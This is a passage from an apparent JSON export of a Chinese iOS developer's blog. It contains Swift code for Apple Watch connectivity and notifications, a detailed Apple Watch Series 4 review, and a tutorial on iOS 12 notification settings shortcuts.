WCSession) { } func sessionDidDeactivate(_ session: WCSession) { } static let sharedManager = WatchSessionManager() private override init() { super.init() } private let session: WCSession? = WCSession.isSupported() ? WCSession.default : nil private var validSession: WCSession? { if let session = session, session.isPaired &amp;&amp; session.isWatchAppInstalled { return session } //回傳有效且連接中且手錶APP開啟中的session return nil } func startSession() { session?.delegate = self session?.activate() }}WatchConnectivity 手機端的 Code並在iOS/AppDelegate.swift的application( _ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?)中加入WatchSessionManager.sharedManager.startSession( )以在啟動手機APP後連接上session手錶端：import WatchConnectivityclass WatchSessionManager: NSObject, WCSessionDelegate { func session(_ session: WCSession, activationDidCompleteWith activationState: WCSessionActivationState, error: Error?) { } func sessionReachabilityDidChange(_ session: WCSession) { guard session.isReachable else { return } } func session(_ session: WCSession, didFinish userInfoTransfer: WCSessionUserInfoTransfer, error: Error?) { } func session(_ session: WCSession, didReceiveUserInfo userInfo: [String : Any] = [:]) { DispatchQueue.main.async { //UserDefaults: //print(userInfo) } } static let sharedManager = WatchSessionManager() private override init() { super.init() } private let session: WCSession? = WCSession.isSupported() ? WCSession.default : nil func startSession() { session?.delegate = self session?.activate() }}WatchConnectivity 手錶端的 Code並在WatchOS Extension/ExtensionDelegate.swift中的applicationDidFinishLaunching( ) 加入WatchSessionManager.sharedManager.startSession( )以在啟動手錶APP後連接上sessionWatchConnectivity 資料傳遞方式傳資料用：sendMessage,sendMessageData,transferUserInfo,transferFile收資料用：didReceiveMessageData,didReceive,didReceiveMessage兩端傳接收方法都ㄧ樣可以看到手錶傳資料到手機都通，但手機傳資料到手錶僅限手錶APP開啟中watchOS推播處理專案目錄底下的PushNotificationPayload.apns這時就派上用場了，這是用來在模擬器上測試推播之用，在模擬器上部署Watch App target，安裝完啟動App就會收到一則以這個檔案內容的推播，讓開發者更容易測試推播功能．如要修改/啟用/停用 PushNotificationPayload.apns，請選擇Target後Edit SchemewatchOS 推播處理：同iOS我們實做UNUserNotificationCenterDelegate，在watchOS中我們也實作一樣的方法，在watchOS Extension/ExtensionDelegate.swift中import WatchKitimport UserNotificationsimport WatchConnectivityclass ExtensionDelegate: NSObject, WKExtensionDelegate, UNUserNotificationCenterDelegate { func applicationDidFinishLaunching() { WatchSessionManager.sharedManager.startSession() //前面提到的WatchConnectivity連線 UNUserNotificationCenter.current().delegate = self //設定UNUserNotificationCenter delegate // Perform any final initialization of your application. } func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -&gt; Void) { completionHandler([.sound, .alert]) //同iOS，此做法可讓推播在APP前景時依然會顯示 } func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -&gt; Void) { //點擊推播時 guard let info = response.notification.request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt;,let data = info[\"data\"] as? Dictionary&lt;String,String&gt; else { completionHandler() return } //response.actionIdentifier可得點擊事件Identifier //預設點擊事件：UNNotificationDefaultActionIdentifier if alert[\"type\"] == \"new_ask\") { WKExtension.shared().rootInterfaceController?.pushController(withName: \"showDetail\", context: 100) //取得目前root interface controller 並 push } else { //其他處理.... //WKExtension.shared().rootInterfaceController?.presentController(withName: \"\", context: nil) } completionHandler() }}ExtensionDelegate.swiftwatchOS 推播顯示，分成三種： static： 預設推播顯示方式會同手機推播，這邊手機端iOS有實做UNUserNotificationCenter.setNotificationCategories在通知下方增加按鈕；Apple Watch預設亦然會出現 dynamic：動態處理推播顯示樣式（重組內容、顯示圖片） interactive：watchOS ≥ 5 後支援，在dynamic的基礎下再增加支援按鈕可在Interface.storyboard中的Static Notification Interface Controller Scene設定推播處理方式static沒什麼好說的，就是走預設的顯示方式，這邊先介紹dynamic，勾選「Has Dynamic Interface」後會出現「Dynamic Interface」可在此視圖設計你自訂的推播呈現方式（不能使用Button）：我的自訂推播呈現設計import WatchKitimport Foundationimport UserNotificationsclass NotificationController: WKUserNotificationInterfaceController { @IBOutlet var imageView: WKInterfaceImage! @IBOutlet var titleLabel: WKInterfaceLabel! @IBOutlet var contentLabel: WKInterfaceLabel! override init() { // Initialize variables here. super.init() self.setTitle(\"結婚吧\") //設定右上方標題 // Configure interface objects here. } override func willActivate() { // This method is called when watch view controller is about to be visible to user super.willActivate() } override func didDeactivate() { // This method is called when watch view controller is no longer visible super.didDeactivate() } override func didReceive(_ notification: UNNotification) { if #available(watchOSApplicationExtension 5.0, *) { self.notificationActions = [] //清除iOS實做的UNUserNotificationCenter.setNotificationCategories在通知下方增加的按鈕 } guard let info = notification.request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt; else { return } //推播資訊 self.titleLabel.setText(alert[\"title\"]) self.contentLabel.setText(alert[\"body\"]) if #available(watchOSApplicationExtension 5.0, *) { if alert[\"type\"] == \"new_msg\" { //如果是新訊息推播則在通知下方增加回覆按鈕 self.notificationActions = [UNNotificationAction(identifier: \"replyAction\",title: \"回覆\", options: [.foreground])] } else { //其他則增加查看按鈕 self.notificationActions = [UNNotificationAction(identifier: \"openAction\",title: \"查看\", options: [.foreground])] } } // This method is called when a notification needs to be presented. // Implement it if you use a dynamic notification interface. // Populate your dynamic notification interface as quickly as possible. }}程式部分，ㄧ樣拉outlet到controller並實做功能再來講到interactive，同dynamic，只是能多加Button，能跟dynamic設同個Class控制程式；interactive我沒有使用，因為我的按鈕是用程式self.notificationActions加上去的，差異如下：左使用interactive，右使用self.notificationActions兩個做法都需watchOS ≥ 5 支援．使用self.notificationActions增加按鈕則按鈕事件處理由ExtensionDelegate中的 userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -&gt; Void) 處理，並以identifier識別動作選單功能？在元件庫中拉入Menu，再拉入選單項目Menu Item，再拉IBAction到程式控制在頁面重壓就會出現：內容輸入？使用內建的presentTextInputController方法即可！@IBAction func replyBtnClick() { guard let target = target else { return } self.presentTextInputController(withSuggestions: [\"稍後回覆您\",\"謝謝\",\"歡迎與我聯絡\",\"好的\",\"OK!\"], allowedInputMode: WKTextInputMode.plain) { (results) in guard let results = results else { return } //有輸入值時 let txts = results.filter({ (txt) -&gt; Bool in if let txt = txt as? String,txt != \"\" { return true } else { return false } }).map({ (txt) -&gt; String in return txt as? String ?? \"\" }) //預處理輸入 txts.forEach({ (txt) in print(txt) }) }}總結 謝謝你看到這！辛苦了！到這裡文章已告一段落，大略提了一下UI排版、程式、推播、介面應用部分，有開發過iOS的上手真的很快，幾乎差不多而且許多方法都做了簡化使用起來更簡潔，但能做的事確實也變少了(像是目前還不知道怎麼針對Table做載入更多)；目前能做的事確實很少，希望官方在未來能開放更多API給開發者使用❤️❤️❤️MurMur:Apple Watch App Target 部署到手錶真的有夠慢 — Narcos有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 7,103 Total Views Last Statistics Date: 2025-01-19 | 6,937 Views on Medium. " }, { "title": "Apple Watch Series 4 從入手到上手全方位心得", "url": "/posts/a2920e33e73e/", "categories": "ZRealm Life.", "tags": "apple-watch, watchos, apple-watch-apps, 生活, 開箱", "date": "2018-11-26 22:18:41 +0800", "snippet": "Apple Watch Series 4 開箱 從入手到上手全方位心得 (2020–10–24更新)為什麼要買？好用嗎？哪裡好用？怎麼用？&amp; WatchOS APP推薦[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往從入手開始…個人背景首先自述一下個人使用蘋果產品的背景，我並非忠實果粉；第一次接觸是在 2015 年用打工薪水...", "content": "Apple Watch Series 4 開箱 從入手到上手全方位心得 (2020–10–24更新)為什麼要買？好用嗎？哪裡好用？怎麼用？&amp; WatchOS APP推薦[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往從入手開始…個人背景首先自述一下個人使用蘋果產品的背景，我並非忠實果粉；第一次接觸是在 2015 年用打工薪水買的 iPhone 6，後因工作所需直到去年才開始使用MacOS的電腦(Mac Mini)並在今年購入了自己的MacBook Pro、更換iPhone 8；其中我會踏入蘋果生態系的原因不外乎是： 工作需要（開發iOS APP一定要有MacOS設備） 工作效率（穩定度或程式切換、操作方式體驗都更好再配合生態系iPhone與MacOS之間的連動、資料同步在許多地方都能化繁為簡） 續航力、便攜性、Retina顯示器[2019–05–02更新]：蘋果全家桶的設備再添一項， AirPods 2 (開箱及上手體驗請點此)為何想買Apple Watch? 記錄運動情況、心率狀況 跑步不想帶手機 減少使用手機的時間，但又不想露接重要資訊 大包小包的時候能不用掏出手機/使用Apple Pay 靠近自動解鎖MacBook（我的MacBook Pro非Touch Bar版本，打密碼打得心很累） 騎車看導航 潮！沒用過，想買來玩玩 想寫 WatchOS APP開始挑選…綜合以上因素開始挑選適合的Apple Watch；撇除錶帶材質，單論本體有三種版本可供選擇： 鋁金屬錶殼+可能會刮傷的玻璃表面+GPS = $12,900(40mm) / $13,900 (44mm) 鋁金屬錶殼+可能會刮傷的玻璃表面+GPS+行動網路 = $16,500(40mm) / $17,500 (44mm) 不鏽鋼錶殼+藍寶石硬邦邦玻璃+GPS+行動網路 = $22,900(40mm) / $24,900 (44mm)我個人是買 2. 鋁金屬錶殼+可能會刮傷的玻璃表面+GPS+行動網路 44 mm錶面的部分：大小有40mm/44mm兩種，實際依照個人手腕大小做選擇，太大可能會不合手、心率偵測不準確；太小則戴起來看起來很怪左44mm/右40mm (感謝同事友情支援)如果一時找不到東西比較，可以拿一個日拋隱形眼鏡的匣子作比較約=44mm (實際測量44.5mm)這裡附上筆者的手給大家參考，若還是不確定大小最好還是跑一趟101門市去試戴看看（我當初也是先瞄準40mm，結果去實際帶過才發現太小…）*Apple Watch 3 38mm與 Apple Watch 4 40 mm 大小ㄧ樣錶帶通用 *Apple Watch 3 42mm與 Apple Watch 4 44 mm 大小ㄧ樣錶帶通用錶殼材質有鋁金屬錶殼+可能會刮傷的玻璃表面 和 不鏽鋼錶殼+藍寶石硬邦邦玻璃 兩種，預算充足的朋友當然建議選擇後者；個人因預算不足只好選擇前者；為何要選擇不鏽鋼錶殼+藍寶石硬邦邦玻璃版本呢？1.雖然本體較重（運動時可能會感覺到）但在生活上更容易與穿搭配合，皮革錶帶或金屬錶帶與不修綱機身搭配加上商務衣著能有更一致的品味觀感；休閒或運動時更換運動型錶帶也不失優雅，能動能靜！2.藍寶石硬邦邦玻璃不必費神擔心錶面刮傷（個人使用經驗：我的上一隻 iPhone 6 裸機使用一年多；沒特別傷害它，日常就放口袋、放桌上；螢幕還是刮得亂七八糟但鏡頭部分使用藍寶石硬邦邦玻璃所以完好如初）但我買的是一般版本…如果你上網搜尋Apple Watch貼膜的文章會找到兩派的人，一派支持認為會刮傷要貼膜；另一派反對認為是使用習慣問題、沒那麼脆弱會刮傷、你有看勞力士有貼膜？或你是佛系使用者買來就是要用、消耗性產品那也沒這困擾我個人有點強迫症有刮傷會不爽，所以支持要貼膜；使用習慣問題? 我覺得只有撞到才是使用習慣不良，日常粉塵傷害實在難防如果你也要貼膜，在這裡給你個建議「多花點錢找人貼」，一般我的手機都是自己貼的，為什麼說Apple Watch要找人貼？這部分搞得我心很累，首先我在Pchome買東京*用的玻璃鋼化保護貼來貼($399)，硬膜/只有邊框有膠，貼上去中間呈現一個中空狀態不密合觸控超級不靈敏(認真懷疑廠商是不是沒測試過？)，所以貼一下就撕掉了；第二次嘗試是買g*r軟膜($100/兩片)全膠能密合，但軟的很難貼容易有氣泡；兩片都試了還是有一點氣泡很礙眼，而且不疏油疏水用起來不順手。最後花了$990給人家貼好(x豪包膜) h*a果凍膠玻璃貼，密合、沒氣泡、滿版、疏油疏水如果還是想要自己嘗試貼膜的可以找找水凝膜。貼膜後的手感當然不比原生好（個人感覺大約 97分:100分）而且螢幕會高一小截 ，取捨就看個人囉！3.錶殼部分不鏽鋼較耐撞、刮傷可重新拋光，看同事的不鏽鋼版本完好如初沒任何刮傷；錶殼部分我比較不在意，真的在意的朋友或許可以包膜（？不鏽鋼版本 (感謝同事友情支援)所以預算充足的朋友還是建議升不銹鋼版本．關於選購保護殼：保護貼很容易碎邊，我在沒有保護殼(套)的狀態下，平均貼不到一個月就會不知道怎麼的受傷碎邊，一張$990…之前共換了三張，快吐血；目前用保護套之後已經過了4個月都還完好如初！ 建議「至少要用邊框保護套」哪一牌子都可 我的血淚教訓只想說一句相見恨晚，早知道有保護套這種產品就不用多花冤望錢！要不要買支援行動網路的版本？這部分我持保留態度；個人是有買行動網路版本，以後跑步運動就不用帶手機另外考量到要戴個2~3年不確定未來如何所以就先升級囉，但如果你預算有限，且不會沒帶手機出門，那可以只買WiFi版本就好（價差$3600）請考量以下幾點： 目前Spotify不支援離線播放，運動聽音樂還是要帶手機 (2018/11/21)p.s Apple Music/KKBOX 支援離線播放沒這問題 Apple Watch APP不多，能做的事也只有打電話/回訊息/回Line/回Fb Messenger/Apple Pay 僅此而已*Apple Pay不需行動網路版就能離線使用 行動網路使用需額外申辦並繳交每個月$199電信費(中華/~2018/12/31前申辦優惠價$149)，網路流量吃原本手機的方案 行動網路的運作方式是手錶將資料透過電信傳輸到手機再透過手機發送出去，因此你的 手機也必須處於開機狀態下才能使用手錶． *所以手機沒電關機…手錶也不能用，即使有辦行動網路[2020–10–24 更新] ：Spotify 已支援獨立播放，在手錶 Spotify APP 中選擇播放裝置-&gt;Apple Watch-&gt;連線藍牙耳機-&gt;即可播放！（依然還不支援離線下載播放，需再有網路環境下才可使用）。購買上週(2018/11/11)實際跑了一趟101沒有我要的貨，於是從網路下單由大陸發貨，11/11下單，11/12出貨，11/15準時送達：開箱拿到的時候很興奮直接拆開來用就沒做記錄了，開箱部分可參考網路： Apple Watch Series 4体验 全面屏手表，是你吗 ？ (大陸) 、 Apple Watch series 4完整開箱！其中三點功能超有 感 (台灣)補張開箱圖入手部分到此結束….開始上手配對、基礎設定這裡就不再贅述，可參考上面開箱文；這裡假定你已經都弄好開始使用Apple Watch了附一張按鈕圖 — Apple官方支援中心「Digital Crown」= 「數位錶冠」「Side Button」= 「側邊按鈕」按鈕操作部分： 點一下數位錶冠在主畫面與錶面之間切換 點兩下數位錶冠切換到最近開啟的APP 點一下側邊按鈕呼出Dock (多工視窗)，可設定顯示最近開啟的APP或自訂喜好的APP (打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;Dock-&gt;Dock排列) 點兩下側邊按鈕呼出Apple Pay，這時感應就會直接付款p.s Apple Pay預設卡片修改請打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;錢包與Apple Pay-&gt;交易預設值-&gt;預設卡片-&gt;選擇您要預設的卡片* 無法修改順序，只能指定某一張卡為預設放在第一 長壓側邊按鈕呼出系統選單「關閉電源」或「開機」、顯示醫療卡、播打SOS緊急電話Apple Watch 螢幕截圖功能很重要，所以放第一個，怎麼截Apple Watch的螢幕圖：打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt; 進入「一般」-&gt; 「啟用螢幕快照」打開在Apple Watch上同時按下數位錶冠和側邊按鈕，螢幕出現光影掠過效果後即表示截圖完成；這時打開iPhone就能看到截圖的相片囉！揚聲器手錶內建揚聲器只能通話時使用、播放提示音不能播放音樂；如果覺得用手錶講電話大家都會聽到可使用藍牙耳機各圖示狀態說明請參閱官方文件Apple Watch與iPhone之間的連線手錶在手機附近時使用藍牙，距離太遠時使用WiFi左邊表示連線中斷中，右邊表示連線正常中iPhone APP的通知傳送到Apple Watch手錶預設會吃iPhone上APP的通知設定，也可特別關閉某些APP的通知不要傳送到手錶（打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;「通知」-&gt;拉到最下方可針對各APP調整） 若APP沒在此列表出現則表示該APP本來就沒在iPhone上開啟通知功能（請去「iPhone」上的「設定」-&gt;「通知」-&gt;打開該APP通知功能） 為什麼有的通知會有提示音/震動有的不會？這項設定是吃iPhone上APP的通知設定，APP「通知」有開啟「聲音」就會有提示音及震動 大部分的APP通知都只支援查看，部分可支援操作（如Line的通知可點擊在手錶上回覆） 手機未使用狀態+手錶配戴中，手錶才會跳新通知提示/手機端不會響但依然會出現在通知中心；避免出現手機與手錶都同時響的情況APP有支援For Apple Watch時 預設在安裝APP時該APP有支援For Apple Watch的APP時也會一併在Apple Watch上安裝該APP（可從「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;「一般」-&gt;關閉「自動APP安裝」） 能不能只安裝Apple Watch APP？不行，目前無法獨立安裝Apple Watch APP；一定在iPhone都會有一個APP 不想安裝Apple Watch版的APP從「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;滾動到下方「已在APPLE WATCH上安裝」部分點進去-&gt;關閉「顯示App於Apple Watch」 APP寫支援「複雜功能」的意思就是支援錶盤小工具錶面設計隨便你玩隨便你放，你覺得哪些資訊重要或怎樣設計比較美都看個人；我是把「我隨時看手錶都會想知道的資訊」放在錶盤上，也可以加入多個錶面作切換。手電筒你沒看錯，Apple Watch也有手電筒；在錶面頁由底部上拉出選單找到「手電筒」符號的按鈕，進入後可以左右切化畫面顏色；沒錯，就是螢幕高亮顏色而已！比較特別的是還有一個爆閃模式：讓夜間活動更安全！各個模式「靜音模式」- 所有通知都靜音、都不震動、不亮螢幕提示，僅顯示在通知中心「劇院模式」- 抬手不會喚醒螢幕，要點擊螢幕才會喚醒「水中鎖定」- 螢幕觸控鎖定，要轉動數位錶冠後才能解鎖，解鎖後揚聲器會自動播放聲音排出積水「飛航模式」- 關閉所有外部連線「省電模式」- 真的很省電！只剩下按數位錶冠顯示時間功能，其他完全關閉，幾乎等於關機狀態；退出省電模式要按住側邊按鈕（同開機）以上所有模式，鬧鐘、倒數功能皆會照樣響「省電模式下會強制開機」抬手腕直接呼叫Siri只要抬起手腕，螢幕點亮後，可以直接說話使用Siri!，不用說「Hey! Siri」(EX： 抬手後直接說 “明天天氣” )。在手機離你有一段距離時也能使用Siri(EX：曬衣服的時候)。[2019–05–02更新]：更上一層的Siri體驗？請參考 AirPods 2 開箱及上手體驗心得 中的 Siri部分，AirPods 2 的 Siri 有戴耳機就能直接使用，連抬手腕都不用了。AQI空氣品質無法顯示?內建的AQI似乎不支援台灣地區，要去「App Store」搜尋「在意空氣」下載安裝+開啟後，再到錶盤設計複雜功能的地方改選擇「在意空氣」即可用Apple Watch解鎖Mac電腦 確認你的iPhone/Apple Watch/Mac電腦登入的是同個Apple帳號 確認你的Apple帳號有開啟 雙重認證 系統在檢測到你的Apple帳號有Apple Watch裝置之後就會在「系統偏好設置」-&gt;「安全與隱私權」-&gt;「一般」-&gt;新增一行「允許Apple Watch解鎖您的Mac」-&gt;「打勾即可」若一直啟用失敗，請先確認你的Apple帳號有開啟雙重認證(非 雙步認證 )或試試重啟電腦！p.s 我公司的Mac Mini就是一直無法啟用，重啟之後就正常了相片打開空白？預設顯示iPhone上喜愛的項目，打開iPhone的「相片」在想要傳到手錶上的相片點「愛心」就會出現了活動紀錄及體能訓練活動紀錄每日有三個圈圈三個目標：1. 站立(藍)：每一小時有站立1分鐘就算達成1次2. 運動(綠)：超越快走強度的活動時間才會被計算3.活動(紅)：燃燒的動態卡路里數，有在動就會增加詳細可查看iPhone上「健康」APP有詳細解說。每日達成紀錄會提示，另外可在Apple Watch上的「活動紀錄」APP重壓調整活動目標值（預設一天活動360大卡就達標了）體能訓練部分跑步我是使用Nike Run Club +沒使用內建的，上週去騎腳踏車試用內建的體能訓練-&gt;「室外單車」做紀錄，會記錄高度/距離/時間/路徑/心律 讚讚！地圖功能？目前僅支援Apple Map，Google Map暫時不支援，打開「地圖」搜尋或選擇個人資訊設定的公司住家地址（來源：聯絡資訊-&gt;我的名片）或聯絡資訊或自行輸入目標；開始導航後每個轉折點都是一張卡，依據行駛自動跳頁，可轉動查看，點擊可進入查看地圖內容，距離剩下40公尺的時候會震動提示你，重壓可結束導航．這部分只是把你手機的Apple Map資訊傳到手錶上（手錶導航時手機的導航也會自動打開）實際使用感想：Apple Map的地標很少難搜尋、好像只會導大路，明明有雙線道、更快、沒塞車的路線卻不導…所以還是期待Google Map更新吧，這個就先加減用了這裡附上一個Siri捷徑： 使用Apple Map開啟Google Map項目藍芽拍照按鈕Apple Watch 打開 「相機」這時手機的相機也會打開，就能用手錶控制手機的相機進行拍照、錄影，重壓進行切換鏡頭/設定相機．我的手機在哪裡啊？在錶面頁由底部上拉出選單找到一個「手機在震動的Icon」點擊後手機就會發出聲響！ 手機在靜音、無擾狀態下依然會發出聲響 重壓Icon手機除了發出聲響之外還會發出閃光燈p.s 反過來手機要找手錶則無此功能，若是遺失要找請從「尋找iPhone」中尋找訊息輸入無法辨識手寫中文字、語音也聽無中文覺得這是Bug…在訊息中重壓「麥克風」或「手寫」Icon 呼出選單&gt;「選擇語言」-&gt;「中文」另一方法是，打開「iPhone」-&gt;「設定」-&gt;「一般」-&gt;「鍵盤」-&gt;「聽寫」-&gt;「聽寫語言」-&gt;只勾「國語」這樣你的語音輸入就只聽得懂國語了，手機部分一併受到影響關閉深呼吸提醒／關閉站立提醒打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;呼吸-&gt;關閉呼吸提醒打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;活動紀錄-&gt;關閉站立提醒手錶想設定更複雜的密碼打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;密碼-&gt;簡易密碼-&gt;關閉-&gt;則可設定6位數密碼電話進來手錶能顯示Whoscall資訊嗎？不行。會頓嗎？實際與同事的Apple Watch S3相比，S4 開啟APP幾乎不用Loading、開機也很快實測可參考這部影片： 【最新】4代 Apple Watch Series 4 速度實測 音量比較耗電嗎？我的配戴時間只有起床～洗澡前，睡覺不戴（床靠牆怕無意識時敲到牆壁），洗澡前拆下來充電 晚上12點充滿電拆下放著，隔天早上8點大約剩下95% 晚上12點充滿電拆下放著， 切換飛航模式 ，隔天早上8點大約剩下98%一整天下來約配戴15小時，沒刻意一直玩的話大約剩下65%電量，很能撐，勉強可以兩天一充．*第一次充電可能需要較長時間*前幾天電池效能可能還沒發揮會較耗電實用APP推薦1. 在意空氣 (免費)：支援錶盤複雜功能AQI資訊2. 秒速記帳 ($60)：快速記帳軟體、支援錶盤複雜功能，有試過這套跟C*Money，但C*Money 要$120 而且供介面太過複雜，個人用不上手；所以比較推薦這款3. Bus+ (免費)：查詢公車資訊，原本使用的是台北等公車但該APP不支援Apple Watch，只好忍痛捨棄；Bus+與台北等公車邏輯有所不同，Bus+是以站為基礎，這邊個人的設定方法是；分常用的地點（家裏/公司/捷運站）再把有經過的公車路線加入Bus+4. Nike+ Run Club (免費)：跑步記錄APP5. Shazam (免費)：按一下辨識音樂（雖然直接問Siri也可以），還有另一款soundhound，個人實測是Shazam比較快6. 雙北市Ubike+ (免費)：查看鄰近的/收藏的Ubike站可借跟可停數量7. 錄音機 (免費)：快速使用Apple Watch錄音、傳輸到手機8. 倒數日 (免費)：查看紀念日／未來事件倒數9. Advanced Calculator For Apple Watch OS (免費)：在Apple Watch上使用小計算機Line,Spotify….e.t.c總結及使用一週心得佩戴至今快滿兩週，從原本很新奇的心情到現在已經平淡地融入到生活；到目前為止對生活有感的幫助：解鎖MAC我不用在打冗長的密碼(公司規定離開座位要登出)、即時查看天氣狀況、看看導航、APP通知、看看心律關心一下健康，差不多就如此而已；支援的APP及功能實在太少．使用手機的時間有減少？沒有特別感覺 ，因為收到通知我還是習慣用手機回，手錶回要用語音…在大庭廣眾下…用手寫的又非常慢；再者許多APP是不支援Apple Watch的動輒$12,900起跳真的值得嗎？破萬的手錶有更多很好的選擇，但要連動頻果全家桶就只有一個；如果你只是想單純買隻名錶那大可不必使用Apple Watch；如果你想要能解決日常瑣碎的手錶可以考慮；如果你想要奢侈品+解決日常瑣碎可以考慮不鏽鋼甚至是Hermès版！購買至今曾經有想退掉的念頭，總覺得$17,500能做很多事，花在一隻手錶上好像不太值得，但他的確又對日常生活是有幫助的，這個幫助值不值$17,500呢？我覺得目前不值，等Apple Watch APP生態系更有規模一點再來評估了，目前就是奢侈品XD，因為爽、潮、衝動所以買．其他項目就等大家自行體會囉-[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往手錶都買了，不考慮AirPods 2耳機嗎？請看下一篇&gt;&gt; AirPods 2 開箱及上手體驗心得自己的Apple Watch App 自己開發：請看 動手做一支 Apple Watch App 吧！(Swift)想在手錶控制智慧家電？請看 智慧家居初體驗 — Apple HomeKit &amp; 小米米家使用三個月後心得:詳細請看 這篇1.滿版貼做家事時撞到破了換了一次(吐血)2.增購了一副皮製錶帶：nomad Apple Watch 錶帶有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 20,243 Total Views Last Statistics Date: 2025-01-19 | 20,241 Views on Medium. " }, { "title": "iOS ≥ 12 在使用者的「設定」中增加「APP通知設定頁」捷徑 (Swift)", "url": "/posts/f644db1bb8bf/", "categories": "ZRealm Dev.", "tags": "ios-app-development, ios, swift, push-notification, ios-12", "date": "2018-11-12 22:38:42 +0800", "snippet": "iOS ≥ 12 在使用者的「設定」中增加「APP通知設定頁」捷徑 (Swift)除了從系統關閉通知，讓使用者還有其他選擇緊接著前三篇文章： iOS ≥ 10 Notification Service Extension 應用 (Swift) 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)我們繼續針...", "content": "iOS ≥ 12 在使用者的「設定」中增加「APP通知設定頁」捷徑 (Swift)除了從系統關閉通知，讓使用者還有其他選擇緊接著前三篇文章： iOS ≥ 10 Notification Service Extension 應用 (Swift) 什麼？iOS 12 不需使用者授權就能傳送推播通知(Swift) 從 iOS 9 到 iOS 12 推播通知權限狀態處理(Swift)我們繼續針對推播進行改進，不管是原有的技術或是新開放的功能，都來嘗試嘗試！這次是啥？iOS ≥ 12 可以在使用者的「設定」中增加您的APP通知設定頁面捷徑，讓使用者想要調整通知時，能有其他選擇；可以跳轉到「APP內」而不是從「系統面」直接關閉，ㄧ樣不囉唆先上圖：「設定」-&gt;「APP」-&gt;「通知」-&gt;「在APP中設定」另外在使用者收到通知時，若欲使用3D Touch調整設定「關閉」通知，會多一個「在APP中設定」的選項供使用者選擇「通知」-&gt;「3D Touch」-&gt;「…」-&gt;「關閉…」-&gt;「在APP中設定」怎麼實作？這部分的實作非常簡單，第一步僅需在要求推播權限時多要求一個 .providesAppNotificationSettings 權限即可//appDelegate.swift didFinishLaunchingWithOptions or....if #available(iOS 12.0, *) { let center = UNUserNotificationCenter.current() let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound, .provisional,.providesAppNotificationSettings] center.requestAuthorization(options: permissiones) { (granted, error) in }}在詢問過使用者要不要允許通知之後，通知若為開啟狀態下方就會出現選項囉（ 不論前面使用者按允許或不允許 ）。第二步：第二步，也是最後一步；我們要讓 appDelegate 遵守 UNUserNotificationCenterDelegate 代理並實作 userNotificationCenter( _ center: UNUserNotificationCenter, openSettingsFor notification: UNNotification?) 方法即可！//appDelegate.swiftimport UserNotifications@UIApplicationMainclass AppDelegate: UIResponder, UIApplicationDelegate { var window: UIWindow? func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool { if #available(iOS 10.0, *) { UNUserNotificationCenter.current().delegate = self } return true } //其他部份省略...}extension AppDelegate: UNUserNotificationCenterDelegate { @available(iOS 10.0, *) func userNotificationCenter(_ center: UNUserNotificationCenter, openSettingsFor notification: UNNotification?) { //跳轉到你的設定頁面位置.. //EX: //let VC = SettingViewController(); //self.window?.rootViewController.present(alertController, animated: true) }} 在Appdelegate的didFinishLaunchingWithOptions中實現代理 Appdelegate遵守代理並實作方法完成！相較於前幾篇文章，這個功能實作相較起來非常簡單 🏆總結這個功能跟 前一篇 提到的先不用使用者授權就發干擾性較低的靜音推播給使用者試試水溫有點類似！都是在開發者與使用者之前架起新的橋樑，以往APP太吵，我們會直接進到設定頁無情地關閉所有通知，但這樣對開發者來說，以後不管好的壞的有用的…任何通知都無法再發給使用者，使用者可能也因此錯過重要消息或限定優惠．這個功能讓使用者欲關閉通知時能有進到APP調整通知的選擇，開發者可以針對推播項目細分，讓使用者決定自己想要收到什麼類型的推播。以 結婚吧APP 來說，使用者若覺得專欄通知太干擾，可個別關閉；但依然能收到重要系統消息通知． p.s 個別關閉通知功能是我們APP本來就有的功能，但透過結合iOS ≥12的新通知特性能有更好的效果及使用者體驗的提升有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,634 Total Views Last Statistics Date: 2025-01-19 | 1,614 Views on Medium. " }, { "title": "永遠保持探索新事物的熱忱", "url": "/posts/8d863bcd1c55/", "categories": "ZRealm Life.", "tags": "ios-app-development, back-end-development, life-lessons, 生活, medium", "date": "2018-11-04 02:54:07 +0800", "snippet": "永遠保持探索新事物的熱忱從踏入資訊領域到轉戰iOS APP開發的人生契機Bangkok 2018 - Z Realm — 解決問題的道路上你並不孤單時間過得真快，從Back End轉跳開發Mobile iOS APP 滿一年、開始寫Medium也滿一個月，第10篇小小小里程碑就容我寫一篇自我突破轉換跑道心得。永遠保持探索新事物的熱忱「探索的本能促使人類偉大的成就」從古代哥倫布探索海洋發現新大...", "content": "永遠保持探索新事物的熱忱從踏入資訊領域到轉戰iOS APP開發的人生契機Bangkok 2018 - Z Realm — 